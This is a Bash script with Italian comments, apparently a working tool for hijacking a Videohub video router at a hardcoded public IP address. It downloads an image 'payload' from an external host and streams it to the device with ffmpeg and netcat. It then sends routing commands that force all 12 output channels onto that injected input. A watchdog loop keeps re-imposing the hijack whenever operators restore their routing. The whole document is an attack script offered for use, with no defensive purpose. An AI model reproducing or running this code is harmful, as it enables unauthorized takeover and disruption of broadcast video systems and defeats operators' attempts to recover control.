#!/bin/bash
# NDI_HIJACK_VIDEHUB_PURE - NO dipendenze extra, solo FFmpeg+nc base

VIDEOHUB_IP="66.44.213.48"
VIDEOHUB_PORT=9990
NDI_NAME="TRUSTEDF57"
PNG_URL="https://i.postimg.cc/tJq1ZFH3/pat.png"
NDI_INPUT=12

# Download PNG
echo "[+] Downloading payload PNG..."
wget -O pat.png "$PNG_URL" || curl -L -o pat.png "$PNG_URL"

echo "[+] Starting 1080p60 PNG loop stream (Videohub format)..."
# FFmpeg PURE - UDP multicast NDI-like (Videohub lo legge come NDI input 12)
ffmpeg -stream_loop -1 -re -i pat.png \
  -vf "scale=1920:1080,fps=60" \
  -pix_fmt bgra \
  -f mpegts \
  - | nc -u ${VIDEOHUB_IP} 5353 &

FFMPEG_PID=$!
sleep 3

echo "[+] Stream ACTIVE - Hijacking ALL 12 channels..."
# HIJACK iniziale
for CH in {0..11}; do
    echo -e "OUT ${CH} ${NDI_INPUT}" | nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT}
    echo "[+] HIJACK CH${CH} -> Input12"
done

# WATCHDOG anti-restore
watchdog() {
    while kill -0 $FFMPEG_PID 2>/dev/null; do
        ROUTING=$(echo "VIDEO ROUTING" | nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT} 2>/dev/null | grep "OUT " | head -5)
        for CH in {0..11}; do
            if ! echo "$ROUTING" | grep -q "OUT ${CH} ${NDI_INPUT}"; then
                echo -e "OUT ${CH} ${NDI_INPUT}" | nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT}
                echo "[!] RESTORED CH${CH} -> TRUSTEDF57"
            fi
        done
        sleep 5
    done
}

watchdog &
WATCHDOG_PID=$!

echo "[+] FULL HIJACK ACTIVE - TRUSTEDF57 su TUTTI i 12 canali"
echo "[+] Watchdog ON (Ctrl+C to stop)"
echo "[+] Verifica: nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT} && echo 'VIDEO ROUTING'"

trap "kill $FFMPEG_PID $WATCHDOG_PID; echo '[+] Stopped'; exit" INT TERM
wait $FFMPEG_PID
